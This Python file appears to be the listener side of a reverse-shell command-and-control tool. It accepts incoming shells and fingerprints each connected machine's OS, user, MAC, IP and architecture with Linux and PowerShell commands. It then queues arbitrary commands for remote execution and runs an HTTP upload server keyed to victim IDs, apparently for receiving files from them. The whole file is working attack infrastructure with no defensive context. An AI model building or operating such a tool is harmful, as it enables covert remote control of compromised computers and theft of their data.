import socket
import threading
import time
import random, string
import datetime
import core.upload as uSrv
from http.server import HTTPServer

def ouiSearch(mac:str):

    oui = ''.join(mac.split(":")[:3]).upper()

    if oui.lower() == "ffffff": return "broadcast" 

    with open("./core/ouis.txt", "r", encoding='utf-8') as f:
        for line in f:
            #print(line)
            soui, company = line.strip().split("=", 1)
            if soui == oui:
                return company
            
    return "unknown"

class shellServer:
    def __init__(self, port=6940, websock=None) -> None:
        self.port = port

        self.commandQueue = {}
        self.responseQueue = {}
        self.uids = {}
        self.info = {}
        self.kill = []
        self.websock = websock

        threading.Thread(target=self.start, daemon=True).start()

    """
    listen for a connection on thread 1, when recieved send socket object to new thread, which handles the connection
    each connection has its own thread
    """

    def start(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                sock.bind(("0.0.0.0", self.port))
                break
            except OSError:
                time.sleep(0.25)
                print("waiting for bind to open...")
        sock.listen(1)

        while True:
            
            try:
                conn, addr = sock.accept()
                sock.settimeout(30)
            except Exception as e:
                print("failed connection: {}".format(e))
                continue

            if conn:
                print("connection from {}".format(addr))
                threading.Thread(target=self.handle, args=(conn, addr,), daemon=True).start()

            time.sleep(0.25)

    def handle(self, s, addr):
        """
        this only handles the **SOCKET** connection and some commands
        """
        uid = self.genUID()
        harvestedInfo = {} 
        heartbeat = 0

        self.uids[uid] = addr[0]

        def sendCmd(command, uid): # uid is only to take spot
            try:
                s.sendall((command+'\n').encode('ascii'))
                a = s.recv(2048*8).decode('ascii').strip()
            except:
                quit()

            return a

        # harvest info
        harvestedInfo = self.harvestInfo(uid, sendCmd)

        self.info[uid] = harvestedInfo
        if self.websock != None: self.websock.send({"connection": self.info[uid]})

        print('got info')
            
        while True:
            if uid in self.kill:
                sendCmd("exit", uid)
                print("killed {} (kill list)".format(uid))
                return
            
            if uid in self.commandQueue:
                if type(self.commandQueue[uid]) == tuple:
                    s.sendall(self.commandQueue[uid].encode('ascii'))
                    self.commandQueue.pop(uid)        
                    threading.Thread(target=s.recv, args=(2048*16,), daemon=True).start() # receive data and clear the socket without waiting for it - theres probaby a better way, but its whatever atp
                    heartbeat = 0

                s.sendall(self.commandQueue[uid].encode('ascii'))
                self.commandQueue.pop(uid)

                # recieve
                d = []
                while True:
                    recieved = s.recv(2048*8).decode('ascii')
                    if recieved.strip()[-1] == "0":
                        d.append(recieved)
                        self.responseQueue[uid] = "".join(d)
                        break
                    else:
                        d.append(recieved)
                    time.sleep(0.05)

            else:
                pass

            time.sleep(0.05)

    def runCommand(self, uid, command, _async=False):
        data = []
        if _async:
            self.commandQueue[uid] = (command+'\n')
            return
        else:
            self.commandQueue[uid] = command+';echo 0\n'

        while True:
            if uid in list(self.responseQueue.keys()):
                data = self.responseQueue[uid]
                self.responseQueue.pop(uid)
                return data.strip()
            else:
                time.sleep(0.05)

    def genUID(self, length=16):
        uid = ''.join([random.choice(string.ascii_uppercase) for _ in range(length)])
        uSrv.allowedAuth.append(uid)
        print('[+] appended uid \"{}\" to allowed upload tokens'.format(uid))
        return uid
    
    def harvestInfo(self, uid, sendCmd): # sendCmd is a seperate function for different types of shells
        """
        this harvests info regardless of shell, thanks to the sendCmd being an argument
        sendCmd must always be (cmd, uid)

        YOU must define sendCmd and pass it here
        """
        harvestedInfo = {}
        windows = False

        # harvest info
        shell = sendCmd("echo $SHELL", uid)
        if len(shell) > 1 and shell != "$SHELL":
            harvestedInfo["shelltype"] = shell
            harvestedInfo["os"] = "Linux"

        elif shell == "$SHELL":
            harvestedInfo["shelltype"] = "command prompt"
            harvestedInfo["os"] = "Windows"
            windows = True

        elif shell == "":
            if len(sendCmd("Get-Host", uid)) > 1:
                harvestedInfo["shelltype"] = "powershell"
                harvestedInfo["os"] = "Windows"
                windows = True

        # hostname
        harvestedInfo["hostname"] = sendCmd("whoami", uid)

        if windows:
            if harvestedInfo["shelltype"] == "powershell":
                harvestedInfo['mac'] = sendCmd("Get-NetAdapter | Where-Object { $_.InterfaceAlias -eq (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceAlias } | Select-Object -ExpandProperty MacAddress", uid).replace("-", ":")
                harvestedInfo['ip'] = sendCmd("$mainInterface = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' -and $_.NextHop -ne '0.0.0.0' }).InterfaceIndex; (Get-NetIPAddress | Where-Object { $_.InterfaceIndex -eq $mainInterface -and $_.AddressFamily -eq 'IPv4' }).IPAddress", uid)
                harvestedInfo['arch'] = "x86" if sendCmd("(Get-WmiObject -Class Win32_Processor).Architecture", uid) == "0" else "x64"
            else:
                harvestedInfo['mac'] = "idk"
                harvestedInfo['ip'] = "idk"
                harvestedInfo['arch'] = "probably x64"
        else:
            harvestedInfo['mac'] = sendCmd("ip -o link | awk '$2 != \"lo:\" {print $2, $(NF-2)}'", uid).split("\n")[0].split(": ")[-1]
            harvestedInfo['ip'] = sendCmd("ip route get 1 | awk '{print $NF; exit}'", uid)
            harvestedInfo['arch'] = sendCmd("lscpu | awk '/Architecture/ {print $2}'", uid)

        harvestedInfo['firstSeen'] = datetime.datetime.now().strftime("%H:%M")
        harvestedInfo['lastActive'] = datetime.datetime.now().strftime("%H:%M")
        harvestedInfo['uid'] = uid
        harvestedInfo['oui'] = ouiSearch(harvestedInfo['mac'])
        harvestedInfo['active'] = True

        print(harvestedInfo)

        return harvestedInfo
    
    def killUID(self, uid):
        self.kill.append(uid)
        self.uids.pop(uid)
        self.info.pop(uid)

        time.sleep(0.1)

        return
    
class uploadServer:
    def __init__(self, port=11932, address="0.0.0.0", websock=False) -> None:
        self.port = port
        self.address = address
        if websock: uSrv.websock = websock
        self.server = HTTPServer((self.address, self.port), uSrv.FileUploadHandler)

        self.start()

        print('started upload server @ {}:{}'.format(address, port))

    def start(self):
        """
        nonblocking
        """
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        return True
    
    def stop(self):
        return self.server.shutdown()
    
    def removeAuth(self, uid):
        try:
            uSrv.allowedAuth.remove(uid)
            return True
        except ValueError:
            return False
        
    def addAuth(self, uid):
        try:
            uSrv.allowedAuth.append(uid)
            return True
        except:
            return False